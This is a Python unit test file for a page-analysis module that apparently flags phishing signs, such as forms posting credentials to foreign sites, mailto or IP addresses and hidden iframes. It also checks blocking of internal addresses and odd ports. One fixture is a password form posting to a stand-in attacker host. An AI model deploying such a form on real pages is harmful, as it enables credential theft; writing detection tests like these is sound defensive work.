import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import page_analysis as pa  # noqa: E402


class PageAnalysisTest(unittest.TestCase):
    def test_form_sent_to_another_site(self):
        html = '<form action="https://evil-collector.top/steal.php"><input type="email" name="email"><input type="password"></form>'
        r = pa.parse_html(html, "https://bank-login.example/")
        self.assertIn("xdomain_form", {f["k"] for f in r["flags"]})

    def test_form_to_same_site_is_ok(self):
        r = pa.parse_html('<form action="/login"><input type="password"><input name="user"></form>', "https://site.com/")
        self.assertEqual([f["k"] for f in r["flags"]], ["form_ok"])

    def test_mailto_ip_and_hidden_iframe(self):
        r = pa.parse_html('<form action="mailto:a@b.c"><input type="password"></form>', "https://x.com/")
        self.assertIn("mailto_form", {f["k"] for f in r["flags"]})
        r = pa.parse_html('<form action="http://203.0.113.9/p"><input type="password"></form>', "https://x.com/")
        self.assertIn("ip_form", {f["k"] for f in r["flags"]})
        r = pa.parse_html('<iframe src="x" width="0" height="0"></iframe>', "https://x.com/")
        self.assertIn("hidden_iframe", {f["k"] for f in r["flags"]})

    def test_internal_addresses_are_blocked(self):
        for host in ("127.0.0.1", "localhost", "169.254.169.254", "10.0.0.5", "192.168.1.1"):
            self.assertFalse(pa._is_public(host), host)

    def test_fetch_refuses_odd_ports_and_schemes(self):
        self.assertEqual(pa.fetch("http://example.com:8080/")[1], "port blocked")
        self.assertEqual(pa.fetch("ftp://example.com/")[1], "unsupported link")


if __name__ == "__main__":
    unittest.main()
